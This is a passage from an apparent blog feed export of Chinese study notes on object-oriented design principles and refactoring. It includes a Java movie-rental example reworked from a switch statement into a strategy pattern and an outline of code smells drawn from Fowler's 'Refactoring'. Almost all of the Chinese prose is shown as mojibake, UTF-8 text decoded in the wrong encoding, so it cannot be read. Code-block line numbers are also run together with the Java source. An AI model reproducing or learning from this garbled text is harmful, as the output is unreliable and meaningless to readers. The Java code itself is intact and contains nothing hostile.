é«˜å±‚æ¨¡å—åŒ…å«ä¸€ä¸ªåº”ç”¨ç¨‹åºä¸­é‡è¦çš„ç­–ç•¥é€‰æ‹©å’Œä¸šåŠ¡æ¨¡å—ï¼Œå¦‚æœé«˜å±‚æ¨¡å—ä¾èµ–äºä½å±‚æ¨¡å—ï¼Œé‚£ä¹ˆä½å±‚æ¨¡å—çš„æ”¹åŠ¨å°±ä¼šç›´æ¥å½±å“åˆ°é«˜å±‚æ¨¡å—ï¼Œä»è€Œè¿«ä½¿é«˜å±‚æ¨¡å—ä¹Ÿéœ€è¦æ”¹åŠ¨ã€‚ ä¾èµ–äºæŠ½è±¡æ„å‘³ç€ï¼š ä»»ä½•å˜é‡éƒ½ä¸åº”è¯¥æŒæœ‰ä¸€ä¸ªæŒ‡å‘å…·ä½“ç±»çš„æŒ‡é’ˆæˆ–è€…å¼•ç”¨ï¼› ä»»ä½•ç±»éƒ½ä¸åº”è¯¥ä»å…·ä½“ç±»æ´¾ç”Ÿï¼› ä»»ä½•æ–¹æ³•éƒ½ä¸åº”è¯¥è¦†å†™å®ƒçš„ä»»ä½•åŸºç±»ä¸­çš„å·²ç»å®ç°çš„æ–¹æ³•ã€‚ å…¶ä»–å¸¸è§åŸåˆ™é™¤äº†ä¸Šè¿°çš„ç»å…¸åŸåˆ™ï¼Œåœ¨å®é™…å¼€å‘ä¸­è¿˜æœ‰ä¸‹é¢è¿™äº›å¸¸è§çš„è®¾è®¡åŸåˆ™ã€‚ ç®€å†™ å…¨æ‹¼ ä¸­æ–‡ç¿»è¯‘ LOD The Law of Demeter è¿ªç±³ç‰¹æ³•åˆ™ CRP The Composite Reuse Principle åˆæˆå¤ç”¨åŸåˆ™ CCP The Common Closure Principle å…±åŒå°é—­åŸåˆ™ SAP The Stable Abstractions Principle ç¨³å®šæŠ½è±¡åŸåˆ™ SDP The Stable Dependencies Principle ç¨³å®šä¾èµ–åŸåˆ™ 1. è¿ªç±³ç‰¹æ³•åˆ™è¿ªç±³ç‰¹æ³•åˆ™åˆå«ä½œæœ€å°‘çŸ¥è¯†åŸåˆ™ï¼ˆLeast Knowledge Principleï¼Œç®€å†™ LKPï¼‰ï¼Œå°±æ˜¯è¯´ä¸€ä¸ªå¯¹è±¡åº”å½“å¯¹å…¶ä»–å¯¹è±¡æœ‰å°½å¯èƒ½å°‘çš„äº†è§£ï¼Œä¸å’Œé™Œç”Ÿäººè¯´è¯ã€‚ 2. åˆæˆå¤ç”¨åŸåˆ™å°½é‡ä½¿ç”¨å¯¹è±¡ç»„åˆï¼Œè€Œä¸æ˜¯ç»§æ‰¿æ¥è¾¾åˆ°å¤ç”¨çš„ç›®çš„ã€‚ 3. å…±åŒå°é—­åŸåˆ™ä¸€èµ·ä¿®æ”¹çš„ç±»ï¼Œåº”è¯¥ç»„åˆåœ¨ä¸€èµ·ï¼ˆåŒä¸€ä¸ªåŒ…é‡Œï¼‰ã€‚å¦‚æœå¿…é¡»ä¿®æ”¹åº”ç”¨ç¨‹åºé‡Œçš„ä»£ç ï¼Œæˆ‘ä»¬å¸Œæœ›æ‰€æœ‰çš„ä¿®æ”¹éƒ½å‘ç”Ÿåœ¨ä¸€ä¸ªåŒ…é‡Œï¼ˆä¿®æ”¹å…³é—­ï¼‰ï¼Œè€Œä¸æ˜¯éå¸ƒåœ¨å¾ˆå¤šåŒ…é‡Œã€‚ 4. ç¨³å®šæŠ½è±¡åŸåˆ™æœ€ç¨³å®šçš„åŒ…åº”è¯¥æ˜¯æœ€æŠ½è±¡çš„åŒ…ï¼Œä¸ç¨³å®šçš„åŒ…åº”è¯¥æ˜¯å…·ä½“çš„åŒ…ï¼Œå³åŒ…çš„æŠ½è±¡ç¨‹åº¦è·Ÿå®ƒçš„ç¨³å®šæ€§æˆæ­£æ¯”ã€‚ 5. ç¨³å®šä¾èµ–åŸåˆ™åŒ…ä¹‹é—´çš„ä¾èµ–å…³ç³»éƒ½åº”è¯¥æ˜¯ç¨³å®šæ–¹å‘ä¾èµ–çš„ï¼ŒåŒ…è¦ä¾èµ–çš„åŒ…è¦æ¯”è‡ªå·±æ›´å…·æœ‰ç¨³å®šæ€§ã€‚ å‚è€ƒèµ„æ–™ Java ç¼–ç¨‹æ€æƒ³ æ•æ·è½¯ä»¶å¼€å‘ï¼šåŸåˆ™ã€æ¨¡å¼ä¸å®è·µ é¢å‘å¯¹è±¡è®¾è®¡çš„ SOLID åŸåˆ™ çœ‹æ‡‚ UML ç±»å›¾å’Œæ—¶åºå›¾ UML ç³»åˆ—â€”â€”æ—¶åºå›¾ï¼ˆé¡ºåºå›¾ï¼‰sequence diagram é¢å‘å¯¹è±¡ç¼–ç¨‹ä¸‰å¤§ç‰¹æ€§ â€”â€” å°è£…ã€ç»§æ‰¿ã€å¤šæ€]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[é‡æ„]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2F%E9%87%8D%E6%9E%84%2F</url>
    <content type="text"><![CDATA[ä¸€ã€ç¬¬ä¸€ä¸ªæ¡ˆä¾‹ äºŒã€é‡æ„åŸåˆ™ å®šä¹‰ ä¸ºä½•é‡æ„ ä¸‰æ¬¡æ³•åˆ™ é—´æ¥å±‚ä¸é‡æ„ ä¿®æ”¹æ¥å£ ä½•æ—¶ä¸è¯¥é‡æ„ é‡æ„ä¸è®¾è®¡ é‡æ„ä¸æ€§èƒ½ ä¸‰ã€ä»£ç çš„åå‘³é“ 1. é‡å¤ä»£ç  2. è¿‡é•¿å‡½æ•° 3. è¿‡å¤§çš„ç±» 4. è¿‡é•¿çš„å‚æ•°åˆ—è¡¨ 5. å‘æ•£å¼å˜åŒ– 6. æ•£å¼¹å¼ä¿®æ”¹ 7. ä¾æ‹æƒ…ç»“ 8. æ•°æ®æ³¥å›¢ 9. åŸºæœ¬ç±»å‹åæ‰§ 10. switch æƒŠæ‚šç°èº« 11. å¹³è¡Œç»§æ‰¿ä½“ç³» 12. å†—ä½™ç±» 13. å¤¸å¤¸å…¶è°ˆæœªæ¥æ€§ 14. ä»¤äººè¿·æƒ‘çš„æš‚æ—¶å­—æ®µ 15. è¿‡åº¦è€¦åˆçš„æ¶ˆæ¯é“¾ 16. ä¸­é—´äºº 17. ç‹æ˜µå…³ç³» 18. å¼‚æ›²åŒå·¥çš„ç±» 19. ä¸å®Œç¾çš„ç±»åº“ 20. å¹¼ç¨šçš„æ•°æ®ç±» 21. è¢«æ‹’ç»çš„é¦ˆèµ  22. è¿‡å¤šçš„æ³¨é‡Š å››ã€æ„ç­‘æµ‹è¯•ä½“ç³» äº”ã€é‡æ–°ç»„ç»‡å‡½æ•° 1. æç‚¼å‡½æ•° 2. å†…è”å‡½æ•° 3. å†…è”ä¸´æ—¶å˜é‡ 4. ä»¥æŸ¥è¯¢å–ä»£ä¸´æ—¶å˜é‡ 5. å¼•èµ·è§£é‡Šå˜é‡ 6. åˆ†è§£ä¸´æ—¶å˜é‡ 7. ç§»é™¤å¯¹å‚æ•°çš„èµ‹å€¼ 8. ä»¥å‡½æ•°å¯¹è±¡å–ä»£å‡½æ•° 9. æ›¿æ¢ç®—æ³• å…­ã€åœ¨å¯¹è±¡ä¹‹é—´æ¬ç§»ç‰¹æ€§ 1. æ¬ç§»å‡½æ•° 2. æ¬ç§»å­—æ®µ 3. æç‚¼ç±» 4. å°†ç±»å†…è”åŒ– 5. éšè—å§”æ‰˜å…³ç³» 6. ç§»é™¤ä¸­é—´äºº 7. å¼•å…¥å¤–åŠ å‡½æ•° 8. å¼•å…¥æœ¬åœ°æ‰©å±• ä¸ƒã€é‡æ–°ç»„ç»‡æ•°æ® 1. è‡ªå°è£…å­—æ®µ 2. ä»¥å¯¹è±¡å–ä»£æ•°æ®å€¼ 3. å°†å€¼å¯¹è±¡æ”¹æˆå¼•ç”¨å¯¹è±¡ 4. å°†å¼•ç”¨å¯¹è±¡æ”¹ä¸ºå€¼å¯¹è±¡ 5. ä»¥å¯¹è±¡å–ä»£æ•°ç»„ 6. èµ‹å€¼è¢«ç›‘è§†æ•°æ® 7. å°†å•å‘å…³è”æ”¹ä¸ºåŒå‘å…³è” 8. å°†åŒå‘å…³è”æ”¹ä¸ºå•å‘å…³è” 9. ä»¥å­—é¢å¸¸é‡å–ä»£é­”æ³•æ•° 10. å°è£…å­—æ®µ 11. å°è£…é›†åˆ 12. ä»¥æ•°æ®ç±»å–ä»£è®°å½• 13. ä»¥ç±»å–ä»£ç±»å‹ç  14. ä»¥å­ç±»å–ä»£ç±»å‹ç  15. ä»¥ State/Strategy å–ä»£ç±»å‹ç  16. ä»¥å­—æ®µå–ä»£å­ç±» å…«ã€ç®€åŒ–æ¡ä»¶è¡¨è¾¾å¼ 1. åˆ†è§£æ¡ä»¶è¡¨è¾¾å¼ 2. åˆå¹¶æ¡ä»¶è¡¨è¾¾å¼ 3. åˆå¹¶é‡å¤çš„æ¡ä»¶ç‰‡æ®µ 4. ç§»é™¤æ§åˆ¶æ ‡è®° 5. ä»¥å«è¯­å¥å–ä»£åµŒå¥—æ¡ä»¶è¡¨è¾¾å¼ 6. ä»¥å¤šæ€å–ä»£æ¡ä»¶è¡¨è¾¾å¼ 7. å¼•å…¥ Null å¯¹è±¡ 8. å¼•å…¥æ–­è¨€ ä¹ã€ç®€åŒ–å‡½æ•°è°ƒç”¨ 1. å‡½æ•°æ”¹å 2. æ·»åŠ å‚æ•° 3. ç§»é™¤å‚æ•° 4. å°†æŸ¥è¯¢å‡½æ•°å’Œä¿®æ”¹å‡½æ•°åˆ†ç¦» 5. ä»¤å‡½æ•°æºå¸¦å‚æ•° 6. ä»¥æ˜ç¡®å‡½æ•°å–ä»£å‚æ•° 7. ä¿æŒå¯¹è±¡å®Œæ•´ 8. ä»¥å‡½æ•°å–ä»£å‚æ•° 9. å¼•å…¥å‚æ•°å¯¹è±¡ 10. ç§»é™¤è®¾å€¼å‡½æ•° 11. éšè—å‡½æ•° 12. ä»¥å·¥å‚å‡½æ•°å–ä»£æ„é€ å‡½æ•° 13. å°è£…å‘ä¸‹è½¬å‹ 14. ä»¥å¼‚å¸¸å–ä»£é”™è¯¯ç  15. ä»¥æµ‹è¯•å–ä»£å¼‚å¸¸ åã€å¤„ç†æ¦‚æ‹¬å…³ç³» 1. å­—æ®µä¸Šç§» 2. å‡½æ•°ä¸Šç§» 3. æ„é€ å‡½æ•°æœ¬ä½“ä¸Šç§» 4. å‡½æ•°ä¸‹ç§» 5. å­—æ®µä¸‹ç§» 6. æç‚¼å­ç±» 7. æç‚¼è¶…ç±» 8. æç‚¼æ¥å£ 9. æŠ˜å ç»§æ‰¿ä½“ç³» 10. å¡‘é€ æ¨¡æ¿å‡½æ•° 11. ä»¥å§”æ‰˜å–ä»£ç»§æ‰¿ 12. ä»¥ç»§æ‰¿å–ä»£å§”æ‰˜ å‚è€ƒèµ„æ–™ ä¸€ã€ç¬¬ä¸€ä¸ªæ¡ˆä¾‹å¦‚æœä½ å‘ç°è‡ªå·±éœ€è¦ä¸ºç¨‹åºæ·»åŠ ä¸€ä¸ªç‰¹æ€§ï¼Œè€Œä»£ç ç»“æ„ä½¿ä½ æ— æ³•å¾ˆæ–¹ä¾¿åœ°è¾¾æˆç›®çš„ï¼Œé‚£å°±å…ˆé‡æ„è¿™ä¸ªç¨‹åºã€‚ åœ¨é‡æ„å‰ï¼Œéœ€è¦å…ˆæ„å»ºå¥½å¯é çš„æµ‹è¯•ç¯å¢ƒï¼Œç¡®ä¿å®‰å…¨åœ°é‡æ„ã€‚ é‡æ„éœ€è¦ä»¥å¾®å°çš„æ­¥ä¼ä¿®æ”¹ç¨‹åºï¼Œå¦‚æœé‡æ„è¿‡ç¨‹å‘ç”Ÿé”™è¯¯ï¼Œå¾ˆå®¹æ˜“å°±èƒ½å‘ç°é”™è¯¯ã€‚ æ¡ˆä¾‹åˆ†æ å½±ç‰‡å‡ºç§Ÿåº—åº”ç”¨ç¨‹åºï¼Œéœ€è¦è®¡ç®—æ¯ä½é¡¾å®¢çš„æ¶ˆè´¹é‡‘é¢ã€‚ åŒ…æ‹¬ä¸‰ä¸ªç±»ï¼šMovieã€Rental å’Œ Customerã€‚ æœ€å¼€å§‹çš„å®ç°æ˜¯æŠŠæ‰€æœ‰çš„è®¡è´¹ä»£ç éƒ½æ”¾åœ¨ Customer ç±»ä¸­ã€‚å¯ä»¥å‘ç°ï¼Œè¯¥ä»£ç æ²¡æœ‰ä½¿ç”¨ Customer ç±»ä¸­çš„ä»»ä½•ä¿¡æ¯ï¼Œæ›´å¤šçš„æ˜¯ä½¿ç”¨ Rental ç±»çš„ä¿¡æ¯ï¼Œå› æ­¤ç¬¬ä¸€ä¸ªå¯ä»¥é‡æ„çš„ç‚¹å°±æ˜¯æŠŠå…·ä½“è®¡è´¹çš„ä»£ç ç§»åˆ° Rental ç±»ä¸­ï¼Œç„¶å Customer ç±»çš„ getTotalCharge() æ–¹æ³•åªéœ€è¦è°ƒç”¨ Rental ç±»ä¸­çš„è®¡è´¹æ–¹æ³•å³å¯ã€‚ 1234567891011121314151617181920212223242526class Customer &#123; private List&lt;Rental&gt; rentals = new ArrayList&lt;&gt;(); void addRental(Rental rental) &#123; rentals.add(rental); &#125; double getTotalCharge() &#123; double totalCharge = 0.0; for (Rental rental : rentals) &#123; switch (rental.getMovie().getMovieType()) &#123; case Movie.Type1: totalCharge += rental.getDaysRented(); break; case Movie.Type2: totalCharge += rental.getDaysRented() * 2; break; case Movie.Type3: totalCharge += rental.getDaysRented() * 3; break; &#125; &#125; return totalCharge; &#125;&#125; 123456789101112131415161718class Rental &#123; private int daysRented; private Movie movie; Rental(int daysRented, Movie movie) &#123; this.daysRented = daysRented; this.movie = movie; &#125; Movie getMovie() &#123; return movie; &#125; int getDaysRented() &#123; return daysRented; &#125;&#125; 1234567891011121314class Movie &#123; static final int Type1 = 0, Type2 = 1, Type3 = 2; private int type; Movie(int type) &#123; this.type = type; &#125; int getMovieType() &#123; return type; &#125;&#125; 12345678910public class App &#123; public static void main(String[] args) &#123; Customer customer = new Customer(); Rental rental1 = new Rental(1, new Movie(Movie.Type1)); Rental rental2 = new Rental(2, new Movie(Movie.Type2)); customer.addRental(rental1); customer.addRental(rental2); System.out.println(customer.getTotalCharge()); &#125;&#125; 15 ä½¿ç”¨ switch çš„å‡†åˆ™æ˜¯ï¼šåªä½¿ç”¨ switch æ‰€åœ¨ç±»çš„æ•°æ®ã€‚è§£é‡Šå¦‚ä¸‹ï¼šswitch ä½¿ç”¨çš„æ•°æ®é€šå¸¸æ˜¯ä¸€ç»„ç›¸å…³çš„æ•°æ®ï¼Œä¾‹å¦‚ getTotalCharge() ä»£ç ä½¿ç”¨äº† Movie çš„å¤šç§ç±»åˆ«æ•°æ®ã€‚å½“è¿™ç»„ç±»åˆ«çš„æ•°æ®å‘ç”Ÿæ”¹å˜æ—¶ï¼Œä¾‹å¦‚å¢åŠ  Movie çš„ç±»åˆ«æˆ–è€…ä¿®æ”¹ä¸€ç§ Movie ç±»åˆ«çš„è®¡è´¹æ–¹æ³•ï¼Œå°±éœ€è¦ä¿®æ”¹ switch ä»£ç ã€‚å¦‚æœè¿åäº†å‡†åˆ™ï¼Œå°±ä¼šæœ‰å¤šä¸ªåœ°æ–¹çš„ switch ä½¿ç”¨äº†è¿™éƒ¨åˆ†çš„æ•°æ®ï¼Œé‚£ä¹ˆè¿™äº› swtich éƒ½éœ€è¦è¿›è¡Œä¿®æ”¹ï¼Œè¿™äº›ä»£ç å¯èƒ½éå¸ƒåœ¨å„ä¸ªåœ°æ–¹ï¼Œä¿®æ”¹å·¥ä½œå¾€å¾€ä¼šå¾ˆéš¾è¿›è¡Œã€‚ä¸Šé¢çš„å®ç°è¿åäº†è¿™ä¸€å‡†åˆ™ï¼Œå› æ­¤éœ€è¦é‡æ„ã€‚ ä»¥ä¸‹æ˜¯ç»§æ‰¿ Movie çš„å¤šæ€è§£å†³æ–¹æ¡ˆï¼Œè¿™ç§æ–¹æ¡ˆå¯ä»¥è§£å†³ä¸Šè¿°çš„ switch é—®é¢˜ï¼Œå› ä¸ºæ¯ç§ç”µå½±ç±»åˆ«çš„è®¡è´¹æ–¹å¼éƒ½è¢«æ”¾åˆ°äº†å¯¹åº” Movie å­ç±»ä¸­ï¼Œå½“å˜åŒ–å‘ç”Ÿæ—¶ï¼Œåªéœ€è¦å»ä¿®æ”¹å¯¹åº”å­ç±»ä¸­çš„ä»£ç å³å¯ã€‚ æœ‰ä¸€æ¡è®¾è®¡åŸåˆ™æŒ‡ç¤ºåº”è¯¥å¤šç”¨ç»„åˆå°‘ç”¨ç»§æ‰¿ï¼Œè¿™æ˜¯å› ä¸ºç»„åˆæ¯”ç»§æ‰¿å…·æœ‰æ›´é«˜çš„çµæ´»æ€§ã€‚ä¾‹å¦‚ä¸Šé¢çš„ç»§æ‰¿æ–¹æ¡ˆï¼Œä¸€éƒ¨ç”µå½±è¦æ”¹å˜å®ƒçš„è®¡è´¹æ–¹å¼ï¼Œå°±è¦æ”¹å˜å®ƒæ‰€å±çš„ç±»ï¼Œä½†æ˜¯å¯¹è±¡æ‰€å±çš„ç±»åœ¨ç¼–è¯‘æ—¶æœŸå°±ç¡®å®šäº†ï¼Œæ— æ³•åœ¨è¿è¡Œè¿‡ç¨‹ä¸­æ”¹å˜ã€‚ï¼ˆè¿è¡Œæ—¶å¤šæ€å¯ä»¥åœ¨è¿è¡Œè¿‡ç¨‹ä¸­æ”¹å˜ä¸€ä¸ªçˆ¶ç±»å¼•ç”¨æŒ‡å‘çš„å­ç±»å¯¹è±¡ï¼Œä½†æ˜¯æ— æ³•æ”¹å˜ä¸€ä¸ªå¯¹è±¡æ‰€å±çš„ç±»ã€‚ï¼‰ ç­–ç•¥æ¨¡å¼å°±æ˜¯ä½¿ç”¨ç»„åˆæ›¿ä»£ç»§æ‰¿çš„ä¸€ç§è§£å†³æ–¹æ¡ˆã€‚å¼•å…¥ Price ç±»ï¼Œå®ƒæœ‰å¤šç§å®ç°ã€‚Movie ç»„åˆäº†ä¸€ä¸ª Price å¯¹è±¡ï¼Œå¹¶ä¸”åœ¨è¿è¡Œæ—¶å¯ä»¥æ”¹å˜ç»„åˆçš„ Price å¯¹è±¡ï¼Œä»è€Œä½¿å¾—å®ƒçš„è®¡è´¹æ–¹å¼å‘ç”Ÿæ”¹å˜ã€‚ é‡æ„åæ•´ä½“çš„ç±»å›¾å’Œæ—¶åºå›¾å¦‚ä¸‹ï¼š é‡æ„åçš„ä»£ç ï¼š 123456789101112131415class Customer &#123; private List&lt;Rental&gt; rentals = new ArrayList&lt;&gt;(); void addRental(Rental rental) &#123; rentals.add(rental); &#125; double getTotalCharge() &#123; double totalCharge = 0.0; for (Rental rental : rentals) &#123; totalCharge += rental.getCharge(); &#125; return totalCharge; &#125;&#125; 1234567891011121314class Rental &#123; private int daysRented; private Movie movie; Rental(int daysRented, Movie movie) &#123; this.daysRented = daysRented; this.movie = movie; &#125; double getCharge() &#123; return daysRented * movie.getCharge(); &#125;&#125; 123interface Price &#123; double getCharge();&#125; 123456class Price1 implements Price &#123; @Override public double getCharge() &#123; return 1; &#125;&#125; 123456class Price2 implements Price &#123; @Override public double getCharge() &#123; return 2; &#125;&#125; 12345678package imp2;class Price3 implements Price &#123; @Override public double getCharge() &#123; return 3; &#125;&#125; 123456789101112class Movie &#123; private Price price; Movie(Price price) &#123; this.price = price; &#125; double getCharge() &#123; return price.getCharge(); &#125;&#125; 1234567891011class App &#123; public static void main(String[] args) &#123; Customer customer = new Customer(); Rental rental1 = new Rental(1, new Movie(new Price1())); Rental rental2 = new Rental(2, new Movie(new Price2())); customer.addRental(rental1); customer.addRental(rental2); System.out.println(customer.getTotalCharge()); &#125;&#125; äºŒã€é‡æ„åŸåˆ™å®šä¹‰é‡æ„æ˜¯å¯¹è½¯ä»¶å†…éƒ¨ç»“æ„çš„ä¸€ç§è°ƒæ•´ï¼Œç›®çš„æ˜¯åœ¨ä¸æ”¹å˜è½¯ä»¶å¯è§‚å¯Ÿè¡Œä¸ºçš„å‰æä¸‹ï¼Œæé«˜å…¶å¯ç†è§£æ€§ï¼Œé™ä½å…¶ä¿®æ”¹æˆæœ¬ã€‚ ä¸ºä½•é‡æ„ æ”¹è¿›è½¯ä»¶è®¾è®¡ ä½¿è½¯ä»¶æ›´å®¹æ˜“ç†è§£ å¸®åŠ©æ‰¾åˆ° Bug æé«˜ç¼–ç¨‹é€Ÿåº¦ ä¸‰æ¬¡æ³•åˆ™ç¬¬ä¸€æ¬¡åšæŸä»¶äº‹æ—¶åªç®¡å»åšï¼›ç¬¬äºŒæ¬¡åšç±»ä¼¼äº‹æƒ…æ—¶å¯ä»¥å»åšï¼›ç¬¬ä¸‰æ¬¡å†åšç±»ä¼¼çš„äº‹ï¼Œå°±åº”è¯¥é‡æ„ã€‚ é—´æ¥å±‚ä¸é‡æ„è®¡ç®—æœºç§‘å­¦ä¸­çš„å¾ˆå¤šé—®é¢˜å¯ä»¥é€šè¿‡å¢åŠ ä¸€ä¸ªé—´æ¥å±‚æ¥è§£å†³ï¼Œé—´æ¥å±‚å…·æœ‰ä»¥ä¸‹ä»·å€¼ï¼š å…è®¸é€»è¾‘å…±äº« åˆ†å¼€è§£é‡Šæ„å›¾å’Œå®ç° éš”ç¦»å˜åŒ– å°è£…æ¡ä»¶é€»è¾‘ é‡æ„å¯ä»¥ç†è§£ä¸ºåœ¨é€‚å½“çš„ä½ç½®æ’å…¥é—´æ¥å±‚ä»¥åŠåœ¨ä¸éœ€è¦æ—¶ç§»é™¤é—´æ¥å±‚ã€‚ ä¿®æ”¹æ¥å£å¦‚æœé‡æ„æ‰‹æ³•æ”¹å˜äº†å·²å‘å¸ƒçš„æ¥å£ï¼Œå°±å¿…é¡»ç»´æŠ¤æ–°æ—§ä¸¤ä¸ªæ¥å£ã€‚å¯ä»¥ä¿ç•™æ—§æ¥å£ï¼Œè®©æ—§æ¥å£å»è°ƒç”¨æ–°æ¥å£ï¼Œå¹¶ä¸”ä½¿ç”¨ Java æä¾›çš„ @deprecation å°†æ—§æ¥å£æ ‡è®°ä¸ºå¼ƒç”¨ã€‚ å¯è§ä¿®æ”¹æ¥å£ç‰¹åˆ«éº»çƒ¦ï¼Œå› æ­¤é™¤éçœŸæœ‰å¿…è¦ï¼Œå¦åˆ™ä¸è¦å‘å¸ƒæ¥å£ï¼Œå¹¶ä¸”ä¸è¦è¿‡æ—©å‘å¸ƒæ¥å£ã€‚ ä½•æ—¶ä¸è¯¥é‡æ„å½“ç°æœ‰ä»£ç è¿‡äºæ··ä¹±æ—¶ï¼Œåº”å½“é‡å†™è€Œä¸æ˜¯é‡æ„ã€‚ ä¸€ä¸ªæŠ˜ä¸­çš„åŠæ³•æ˜¯ï¼Œå°†ä»£ç å°è£…æˆä¸€ä¸ªä¸ªç»„ä»¶ï¼Œç„¶åå¯¹å„ä¸ªç»„ä»¶åšé‡å†™æˆ–è€…é‡æ„çš„å†³å®šã€‚ é‡æ„ä¸è®¾è®¡è½¯ä»¶å¼€å‘æ— æ³•é¢„å…ˆè®¾è®¡ï¼Œå› ä¸ºå¼€å‘è¿‡ç¨‹æœ‰å¾ˆå¤šå˜åŒ–å‘ç”Ÿï¼Œåœ¨æœ€å¼€å§‹ä¸å¯èƒ½éƒ½æŠŠæ‰€æœ‰æƒ…å†µè€ƒè™‘è¿›å»ã€‚ é‡æ„å¯ä»¥ç®€åŒ–è®¾è®¡ï¼Œé‡æ„åœ¨ä¸€ä¸ªç®€å•çš„è®¾è®¡ä¸Šè¿›è¡Œä¿®ä¿®æ”¹æ”¹ï¼Œå½“å˜åŒ–å‘ç”Ÿæ—¶ï¼Œä»¥ä¸€ç§çµæ´»çš„æ–¹å¼å»åº”å¯¹å˜åŒ–ï¼Œè¿›è€Œå¸¦æ¥æ›´å¥½çš„è®¾è®¡ã€‚ é‡æ„ä¸æ€§èƒ½ä¸ºäº†è½¯ä»£ç æ›´å®¹æ˜“ç†è§£ï¼Œé‡æ„å¯èƒ½ä¼šå¯¼è‡´æ€§èƒ½å‡ä½ã€‚ åœ¨ç¼–å†™ä»£ç æ—¶ï¼Œä¸ç”¨å¯¹æ€§èƒ½è¿‡å¤šå…³æ³¨ï¼Œåªæœ‰åœ¨æœ€åæ€§èƒ½ä¼˜åŒ–é˜¶æ®µå†è€ƒè™‘æ€§èƒ½é—®é¢˜ã€‚ åº”å½“åªå…³æ³¨å…³é”®ä»£ç çš„æ€§èƒ½ï¼Œå¹¶ä¸”åªæœ‰ä¸€å°éƒ¨åˆ†çš„ä»£ç æ˜¯å…³é”®ä»£ç ã€‚ ä¸‰ã€ä»£ç çš„åå‘³é“æœ¬ç« ä¸»è¦ä»‹ç»ä¸€äº›ä¸å¥½çš„ä»£ç ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™äº›ä»£ç åº”è¯¥è¢«é‡æ„ã€‚ 1. é‡å¤ä»£ç  Duplicated Code åŒä¸€ä¸ªç±»çš„ä¸¤ä¸ªå‡½æ•°æœ‰ç›¸åŒè¡¨è¾¾å¼ï¼Œåˆ™ç”¨ Extract Method æå–å‡ºé‡å¤ä»£ç ï¼› ä¸¤ä¸ªäº’ä¸ºå…„å¼Ÿçš„å­ç±»å«æœ‰ç›¸åŒçš„è¡¨è¾¾å¼ï¼Œå…ˆä½¿ç”¨ Extract Methodï¼Œç„¶åæŠŠæå–å‡ºæ¥çš„å‡½æ•° Pull Up Method æ¨å…¥è¶…ç±»ã€‚ å¦‚æœåªæ˜¯éƒ¨åˆ†ç›¸åŒï¼Œç”¨ Extract Method åˆ†ç¦»å‡ºç›¸ä¼¼éƒ¨åˆ†å’Œå·®å¼‚éƒ¨åˆ†ï¼Œç„¶åä½¿ç”¨ Form Template Method è¿™ç§æ¨¡æ¿æ–¹æ³•è®¾è®¡æ¨¡å¼ã€‚ å¦‚æœä¸¤ä¸ªæ¯«ä¸ç›¸å…³çš„ç±»å‡ºç°é‡å¤ä»£ç ï¼Œåˆ™ä½¿ç”¨ Extract Class æ–¹æ³•å°†é‡å¤ä»£ç æå–åˆ°ä¸€ä¸ªç‹¬ç«‹ç±»ä¸­ã€‚ 2. è¿‡é•¿å‡½æ•° Long Method å‡½æ•°åº”è¯¥å°½å¯èƒ½å°ï¼Œå› ä¸ºå°å‡½æ•°å…·æœ‰è§£é‡Šèƒ½åŠ›ã€å…±äº«èƒ½åŠ›ã€é€‰æ‹©èƒ½åŠ›ã€‚ åˆ†è§£é•¿å‡½æ•°çš„åŸåˆ™ï¼šå½“éœ€è¦ç”¨æ³¨é‡Šæ¥è¯´æ˜ä¸€æ®µä»£ç æ—¶ï¼Œå°±éœ€è¦æŠŠè¿™éƒ¨åˆ†ä»£ç å†™å…¥ä¸€ä¸ªç‹¬ç«‹çš„å‡½æ•°ä¸­ã€‚ Extract Method ä¼šæŠŠå¾ˆå¤šå‚æ•°å’Œä¸´æ—¶å˜é‡éƒ½å½“åšå‚æ•°ï¼Œå¯ä»¥ç”¨ Replace Temp with Query æ¶ˆé™¤ä¸´æ—¶å˜é‡ï¼ŒIntroduce Parameter Object å’Œ Preserve Whole Object å¯ä»¥å°†è¿‡é•¿çš„å‚æ•°åˆ—å˜å¾—æ›´ç®€æ´ã€‚ æ¡ä»¶å’Œå¾ªç¯è¯­å¥å¾€å¾€ä¹Ÿéœ€è¦æå–åˆ°æ–°çš„å‡½æ•°ä¸­ã€‚ 3. è¿‡å¤§çš„ç±» Large Class åº”è¯¥å°½å¯èƒ½è®©ä¸€ä¸ªç±»åªåšä¸€ä»¶äº‹ï¼Œè€Œè¿‡å¤§çš„ç±»åšäº†è¿‡å¤šäº‹æƒ…ï¼Œéœ€è¦ä½¿ç”¨ Extract Class æˆ– Extract Subclassã€‚ å…ˆç¡®å®šå®¢æˆ·ç«¯å¦‚ä½•ä½¿ç”¨è¯¥ç±»ï¼Œç„¶åè¿ç”¨ Extract Interface ä¸ºæ¯ä¸€ç§ä½¿ç”¨æ–¹å¼æå–å‡ºä¸€ä¸ªæ¥å£ã€‚ 4. è¿‡é•¿çš„å‚æ•°åˆ—è¡¨ Long Parameter List å¤ªé•¿çš„å‚æ•°åˆ—è¡¨å¾€å¾€ä¼šé€ æˆå‰åä¸ä¸€è‡´ï¼Œä¸æ˜“ä½¿ç”¨ã€‚ é¢å‘å¯¹è±¡ç¨‹åºä¸­ï¼Œå‡½æ•°æ‰€éœ€è¦çš„æ•°æ®é€šå¸¸èƒ½åœ¨å®¿ä¸»ç±»ä¸­æ‰¾åˆ°ã€‚ 5. å‘æ•£å¼å˜åŒ– Divergent Change è®¾è®¡åŸåˆ™ï¼šä¸€ä¸ªç±»åº”è¯¥åªæœ‰ä¸€ä¸ªå¼•èµ·æ”¹å˜çš„åŸå› ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œé’ˆå¯¹æŸä¸€å¤–ç•Œå˜åŒ–æ‰€æœ‰ç›¸åº”çš„ä¿®æ”¹ï¼Œéƒ½åªåº”è¯¥å‘ç”Ÿåœ¨å•ä¸€ç±»ä¸­ã€‚ é’ˆå¯¹æŸç§åŸå› çš„å˜åŒ–ï¼Œä½¿ç”¨ Extract Class å°†å®ƒæç‚¼åˆ°ä¸€ä¸ªç±»ä¸­ã€‚ 6. æ•£å¼¹å¼ä¿®æ”¹ Shotgun Surgery ä¸€ä¸ªå˜åŒ–å¼•èµ·å¤šä¸ªç±»ä¿®æ”¹ã€‚ ä½¿ç”¨ Move Method å’Œ Move 